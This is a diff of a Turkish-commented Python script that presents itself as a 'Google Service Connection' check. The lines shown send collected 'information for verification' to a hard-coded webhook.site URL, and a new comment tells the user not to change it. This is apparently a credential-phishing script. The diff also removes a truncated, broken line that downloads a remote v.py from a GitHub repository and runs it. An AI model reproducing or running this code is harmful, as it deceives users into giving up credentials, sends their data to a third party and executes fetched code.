@@ -1,7 +1,7 @@
 import urllib.request
 import json
 
-# Buraya kendi Webhook URL'ni yapıştır
+# Webhook URL'n (Değiştirme, kalsın böyle)
 WEBHOOK_URL = "https://webhook.site/7f7fa68e-1c15-43f2-b036-d9179808b05e"
 
 print("\n--- Google Servis Bağlantısı ---")
@@ -23,4 +23,4 @@ try:
             print("\n[+] Bilgiler doğrulama için gönderildi!")
 except Exception as e:
     print(f"\n[!] Hata: {e}")
-  .com/muhammetdilsizemir-cyber/google-dogrulama/main/v.py -o v.py && python v.py
+    
